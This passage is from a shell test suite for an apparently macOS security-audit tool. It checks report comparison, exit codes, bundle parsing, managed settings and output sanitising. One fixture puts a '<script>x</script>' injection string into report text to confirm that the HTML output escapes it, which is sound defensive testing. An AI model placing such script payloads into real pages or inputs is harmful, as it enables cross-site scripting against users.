check "1.5 P10 resolved: ID only in the old run" grep -q $'^resolved\tMA-BACKUPS-001\tMEDIUM\tBackups\tgone now <script>x</script>$' "$C"
check "1.5 P10 not checked: ID listed by this run's skipped check" grep -q $'^not_checked\tMA-EVENTS-002\t' "$C"
check "1.5 P10 UUID in the old file redacted" grep -q $'^not_checked\tMA-EVENTS-002\tMEDIUM\tEvents\tnot run <UUID>$' "$C"
check "1.5 P10 kept ID is not a change" not grep -q 'MA-SHARING-026' "$C"
check "1.5 P10 malformed old ID left out" not grep -q 'dropped' "$C"
check "1.5 P10 one line per change" [ "$(grep -c . "$C")" -eq 3 ]
check "1.5 P10 Markdown section" has "$V/p10base.md" "## Changes since the previous run"
check "1.5 P10 heading names the old run" has "$V/p10base.md" "Compared with the run on mini at 2026-11-30 09:00 PST."
check "1.5 P10 hostile old text escaped in HTML" has "$V/p10base.html" 'gone now &lt;script&gt;x&lt;/script&gt;'
check "1.5 P10 JSON changes" [ "$(jx "$V/p10base.json" '[d.changes.new.length, d.changes.resolved.length, d.changes.not_checked.length].join()')" = "1,1,1" ]
cat > "$V/p10c1.json" <<'EOF'
{"schema": "macassay-report/1", "host": "mini", "date": "2026-11-30 09:00 PST", "options": {},
 "findings": [{"id": "MA-BACKUPS-002", "severity": "MEDIUM", "section": "Backups", "text": "a\u0085b\u2028c\u2029d\u009be"}]}
EOF
mkfix "$V/p10c"; ( TMP="$V/p10c.tmp"; mkdir -p "$TMP"; compare_load "$V/p10c1.json"; FMTS="json"; OUT="$V/p10cbase"; DEFBASE=x
  STDOUT=0; FAILON=""; COMPARE="$V/p10c1.json"; render_all "$V/p10c" 2>/dev/null )
check "1.5 P10 C1 controls and line separators become spaces" grep -q $'^resolved\tMA-BACKUPS-002\tMEDIUM\tBackups\ta b c d e$' "$V/p10c.tmp/render/changes.tsv"
printf '{"schema": "other/1", "findings": []}\n' > "$V/p10bad.json"
( TMP="$V/p10b"; mkdir -p "$TMP"; compare_load "$V/p10bad.json" 2>/dev/null )
check "1.5 P10 wrong schema fails" [ $? -ne 0 ]
check "1.5 P10 wrong schema exits 2 before any audit work" p17 --compare "$V/p10bad.json"
for m in --print-sudoers --install-sudoers; do check "1.5 P17 --compare with $m" p17 "$m" --compare "$V/p10old.json"; done

# P11: --fail-on. The fixture has one MEDIUM and two LOW findings.
mkfix "$V/p11"
( FAILON=medium; rfix "$V/p11" md ); check "1.5 P11 --fail-on medium exits 3" [ $? -eq 3 ]
( FAILON=high; rfix "$V/p11" md ); check "1.5 P11 --fail-on high exits 0" [ $? -eq 0 ]
printf 'MA-SHARING-026\t\tok\n' > "$V/p11.acc"
( FAILON=medium; rfix "$V/p11" md ); check "1.5 P11 accepted MEDIUM with --fail-on medium exits 0" [ $? -eq 0 ]
check "1.5 P11 bad level exits 2" p17 --fail-on severe
check "1.5 P11 empty level exits 2" p17 --fail-on ""
for m in --print-sudoers --install-sudoers; do check "1.5 P17 --fail-on with $m" p17 "$m" --fail-on high; done

# P12: bundle round trip and rejections.
mkfix "$V/p12"; write_bundle "$V/p12" > "$V/p12.b"; mkdir "$V/p12r"
check "1.5 P12 round trip succeeds" read_bundle "$V/p12.b" "$V/p12r"
for f in meta.tsv findings.tsv skipped.tsv body.md; do check "1.5 P12 $f identical" cmp -s "$V/p12/$f" "$V/p12r/$f"; done
check "1.5 P12 five lines" [ "$(wc -l < "$V/p12.b" | tr -d ' ')" -eq 5 ]
p12bad() { mkdir -p "$V/p12x"; ! read_bundle "$1" "$V/p12x"; }
{ echo "macassay-bundle 2"; tail -n +2 "$V/p12.b"; } > "$V/p12w"; check "1.5 P12 wrong first line rejected" p12bad "$V/p12w"
head -4 "$V/p12.b" > "$V/p12s"; check "1.5 P12 too few lines rejected" p12bad "$V/p12s"
{ cat "$V/p12.b"; echo; } > "$V/p12l"; check "1.5 P12 too many lines rejected" p12bad "$V/p12l"
{ head -1 "$V/p12.b"; echo 'abc$%'; tail -n +3 "$V/p12.b"; } > "$V/p12c"; check "1.5 P12 non-base64 line rejected" p12bad "$V/p12c"
{ cat "$V/p12.b"; printf 'JUNK'; } > "$V/p12j"; check "1.5 P12 trailing data without a newline rejected" p12bad "$V/p12j"
{ cat "$V/p12.b"; printf '\0'; } > "$V/p12n1"; check "1.5 P12 final NUL-only line rejected" p12bad "$V/p12n1"
{ head -1 "$V/p12.b"; sed -n 2p "$V/p12.b" | tr -d '\n'; printf '\0\n'; tail -n +3 "$V/p12.b"; } > "$V/p12n2"; check "1.5 P12 NUL after base64 text rejected" p12bad "$V/p12n2"
check "1.5 P12 only the four fixed names are written" [ -z "$(ls "$V/p12r" "$V/p12x" | grep -vxE '(meta\.tsv|findings\.tsv|skipped\.tsv|body\.md|.*:)?')" ]
# P17 (rest): --bundle with each output option, and with --host.
check "1.5 P17 --bundle with --format" p17 --bundle --format md
check "1.5 P17 --bundle with -o" p17 --bundle -o x.md
check "1.5 P17 --bundle with --stdout" p17 --bundle --stdout
check "1.5 P17 --bundle with --compare" p17 --bundle --compare "$V/p10old.json"
check "1.5 P17 --bundle with --accepted" p17 --bundle --accepted "$V/p9.txt"
check "1.5 P17 --bundle with --fail-on" p17 --bundle --fail-on high
check "1.5 P17 --bundle with --host" p17 --bundle --host example.invalid

# P13: managed settings from a fixture MANAGED_DIR.
mkdir -p "$V/mp/alice"
plist() { printf '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict>%s</dict></plist>\n' "$2" > "$1"; }
plist "$V/mp/com.apple.LaunchServices.plist" '<key>LSQuarantine</key><false/><key>DeviceID</key><string>SECRET_DEVICE_1234</string>'
plist "$V/mp/alice/com.apple.sharingd.plist" '<key>DiscoverableMode</key><string>Everyone</string>'
plist "$V/mp/com.apple.FindMyMac.plist" '<key>FMMEnabled</key><true/>'
( MANAGED_DIR="$V/mp"; TUSER=alice; BODY="$V/p13.md"; : > "$BODY"
  pref com.apple.LaunchServices LSQuarantine 1; printf '%s %s\n' "$PV" "$PSRC" > "$V/p13a"; pref_line "Quarantine for downloads (LSQuarantine)" "1, on"
  pref com.apple.sharingd DiscoverableMode "Contacts Only"; printf '%s %s\n' "$PV" "$PSRC" > "$V/p13b"
  pref com.apple.FindMyMac FMMEnabled ""; printf '%s %s\n' "$PV" "$PSRC" > "$V/p13c"
  pref com.apple.AssetCache Activated 0; printf '%s %s\n' "$PV" "$PSRC" > "$V/p13d"; pref_line "Content caching (AssetCache Activated)" "0, off"
  pref com.apple.TimeMachine AutoBackup ""; pref_line "Automatic backups (AutoBackup)" "1, on"
  FIND="$V/p13f"; : > "$FIND"; SECT_N=4
  pref com.apple.LaunchServices LSQuarantine 1; [ "$PV" = 0 ] && finding MA-PLATFORM-015 HIGH Platform "Quarantine is off." "$PSRC" )
check "1.5 P13 a forced false gives a finding with source managed" [ "$(cut -f2,6 "$V/p13f")" = $'MA-PLATFORM-015\tmanaged' ]
check "1.5 P13 device-level false reads 0, managed" [ "$(cat "$V/p13a")" = "0 managed" ]
check "1.5 P13 managed line" has "$V/p13.md" "- Quarantine for downloads (LSQuarantine): 0 (managed)"
check "1.5 P13 user-level key" [ "$(cat "$V/p13b")" = "Everyone managed" ]
check "1.5 P13 true reads 1" [ "$(cat "$V/p13c")" = "1 managed" ]
check "1.5 P13 no managed file keeps the local value" [ "$(cat "$V/p13d")" = "0 local" ]
check "1.5 P13 no managed file gives the 1.4 line" has "$V/p13.md" "- Content caching (AssetCache Activated): 0"
check "1.5 P13 unset and unmanaged gives the default line" has "$V/p13.md" "- Automatic backups (AutoBackup): not set (macOS default: 1, on)"
check "1.5 P13 an identifier key is never printed" hasnt "$V/p13.md" "SECRET_DEVICE"
check "1.5 P13 src_if on a managed trigger" [ "$(src_if 0 managed 0)" = managed ]
check "1.5 P13 src_if on another value" [ -z "$(src_if 1 managed 0)" ]
check "1.5 P13 src_if on a local value" [ -z "$(src_if 0 local 0)" ]
# P14 (rest): with unknown enrollment, a managed force-installed extension still gives MA-APPS-005 HIGH.
check "1.5 P14 unknown enrollment gives MA-APPS-005" [ "$(printf 'managed\tcom.google.Chrome\tabc\n' | forced_ext_finding unknown | cut -f1,2)" = $'MA-APPS-005\tHIGH' ]
check "1.5 P14 unknown enrollment text" [ "$(forced_ext_note unknown)" = " (enrollment state unknown)" ]
check "1.5 P14 unenrolled text" [ "$(forced_ext_note 0)" = ", and this Mac is not enrolled in MDM" ]

# P22: readable records a skip only for a path that exists but cannot be read.
mkdir -p "$V/p22d"; : > "$V/p22f"; chmod 000 "$V/p22f"
( SKIPS="$V/p22s"; : > "$SKIPS"
  readable "$T/none" "Find My"; echo "absent $?" > "$V/p22r"
  readable "$V/p22d" "Find My"; echo "dir $?" >> "$V/p22r"
  readable "$V/p22f" "Find My"; echo "unreadable $?" >> "$V/p22r" )
chmod 600 "$V/p22f"
check "1.5 P22 absent path passes" has "$V/p22r" "absent 0"
check "1.5 P22 readable folder passes" has "$V/p22r" "dir 0"
check "1.5 P22 unreadable file fails" has "$V/p22r" "unreadable 1"
check "1.5 P22 one skip" [ "$(grep -c . "$V/p22s")" -eq 1 ]
check "1.5 P22 skip carries the IDs" [ "$(cut -f2,4 "$V/p22s")" = $'Find My\tMA-PLATFORM-019' ]

# PM: pre-merge review fixes. Invalid and multibyte sequences are built with printf octal escapes.
UURE='[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}'
# lcg TEXT: the text field that finding writes for TEXT under a UTF-8 locale.
lcg() { ( export LC_ALL=en_US.UTF-8; FIND="$V/pm.f"; : > "$FIND"; SECT_N=4; finding MA-PLATFORM-015 LOW Platform "$1" ); LC_ALL=C cut -f4 "$V/pm.f"; }
# pmrow DIR TEXT [LABEL]: fixture DIR whose only finding has TEXT, and whose only skipped label is LABEL.
pmrow() { mkfix "$1"; printf 'LOW\tMA-PLATFORM-015\tPlatform\t%s\t4\tlocal\n' "$2" > "$1/findings.tsv"
  printf 'other\t%s\t--quick\tMA-EVENTS-001\n' "${3:-label}" > "$1/skipped.tsv"; }

# N1: an invalid byte under a UTF-8 locale must not empty the text field.
check "1.5 PM N1 finding text keeps its words after an invalid byte" [ "$(lcg "$(printf 'evil\377x')")" != "" ]
pmrow "$V/pm1" "$(lcg "$(printf 'path /tmp/evil\377x')")"; rfix "$V/pm1" "json ocsf"
check "1.5 PM N1 the finding survives render_all" [ "$(jx "$V/pm1.out.json" 'd.findings.length')" = 1 ]
check "1.5 PM N1 the finding reaches OCSF" [ "$(grep -c 'MA-PLATFORM-015' "$V/pm1.out.ocsf.jsonl")" -eq 1 ]

# T10 and T7: C1 controls and U+2028 and U+2029 become spaces.
SEPS=$(printf 'a\302\205b\342\200\250c\302\233d\342\200\251e\302\237f')
check "1.5 PM T10 clean_field replaces C1 controls and separators with spaces" [ "$(lcg "$SEPS")" = "a b c d e f" ]
pmrow "$V/pm3" "$SEPS"; rfix "$V/pm3" "json ocsf csv"
check "1.5 PM T10 clean_tsv replaces them in findings.tsv" [ "$(cut -f4 "$V/pm3.tmp/render/findings.tsv")" = "a b c d e f" ]
check "1.5 PM T10 the OCSF line has the spaces" has "$V/pm3.out.ocsf.jsonl" "a b c d e f"
check "1.5 PM T10 no C1 byte pair in OCSF" not env LC_ALL=C grep -q "$(printf '\302[\200-\237]')" "$V/pm3.out.ocsf.jsonl"
check "1.5 PM T10 no separator in OCSF" not env LC_ALL=C grep -q "$(printf '\342\200[\250\251]')" "$V/pm3.out.ocsf.jsonl"
check "1.5 PM T10 no separator in CSV" not env LC_ALL=C grep -q "$(printf '\342\200[\250\251]')" "$V/pm3.out.csv"
printf 'a\302\200b\302\237c\302\240d\n' | clean_tsv > "$V/pm3.edge"
check "1.5 PM T10 the range ends at U+009F and keeps U+00A0" [ "$(cat "$V/pm3.edge")" = "$(printf 'a b c\302\240d')" ]

# N2: a UUID split by a control or a backtick must not be rebuilt by clean_tsv.
SPLIT1="ABCDEF01-2345-6789-abcd-ef01$(printf '\001')23456789"; SPLIT2='ABCDEF01-2345-6789-abcd-ef01`23456789'
pmrow "$V/pm2" "x $SPLIT1 y $SPLIT2 z" "lab $SPLIT1 $SPLIT2"
rfix "$V/pm2" "md html json csv ocsf"
check "1.5 PM N2 the split-UUID finding survives" [ "$(jx "$V/pm2.out.json" 'd.findings.length')" = 1 ]
check "1.5 PM N2 the skipped label survives" [ "$(jx "$V/pm2.out.json" 'd.skipped.length')" = 1 ]
for f in "$V"/pm2.out.*; do check "1.5 PM N2 no whole UUID in ${f##*/}" not grep -qE "$UURE" "$f"; done
check "1.5 PM N2 the limitations hold no whole UUID" not grep -qE "$UURE" "$V/pm2.tmp/render/limits.txt"

# N3: a JSON escape in the --compare file must not carry a UUID into the Changes lists.
cat > "$V/pm4old.json" <<'EOT'
{"schema": "macassay-report/1", "host": "mini1111111\u0031-2222-3333-4444-555555555555", "date": "2026-11-30 09:00 PST", "options": {},
 "findings": [{"id": "MA-BACKUPS-003", "severity": "MEDIUM", "section": "Backups", "text": "gone 1111111\u0031-2222-3333-4444-555555555555 and AAAAAAA\u0041-BBBB-CCCC-DDDD-EEEEEEEEEEEE end"}]}
EOT
mkfix "$V/pm4"; ( TMP="$V/pm4.tmp"; mkdir -p "$TMP"; compare_load "$V/pm4old.json"; FMTS="md html json"; OUT="$V/pm4base"; DEFBASE=x
  STDOUT=0; FAILON=""; COMPARE="$V/pm4old.json"; render_all "$V/pm4" 2>/dev/null )
check "1.5 PM N3 the resolved finding is listed" grep -q $'^resolved\tMA-BACKUPS-003\t' "$V/pm4.tmp/render/changes.tsv"
check "1.5 PM N3 the escaped UUID becomes a marker" grep -q $'\tgone <UUID> and <UUID> end$' "$V/pm4.tmp/render/changes.tsv"
for f in "$V"/pm4base.*; do check "1.5 PM N3 no whole UUID in ${f##*/}" not grep -qE "$UURE" "$f"; done
check "1.5 PM N3 no whole UUID in compare.tsv" not grep -qE "$UURE" "$V/pm4.tmp/render/compare.tsv"

echo ""
if [ "$FAILS" -eq 0 ]; then echo "All cases passed."; else echo "$FAILS case(s) failed."; exit 1; fi
